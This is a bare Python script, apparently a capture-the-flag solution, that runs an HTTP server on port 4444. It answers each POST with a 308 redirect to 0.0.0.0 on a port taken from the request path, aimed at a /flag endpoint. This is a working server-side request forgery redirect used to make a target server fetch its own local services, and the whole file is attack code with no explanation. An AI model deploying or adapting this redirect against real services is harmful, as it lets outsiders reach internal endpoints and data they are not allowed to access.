import http.server

class handler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        self.send_response(308)
        self.send_header("Location", f"http://0.0.0.0:{self.path[1:]}/flag")
        self.end_headers()

with http.server.HTTPServer(("", 4444), handler) as server:
    server.serve_forever()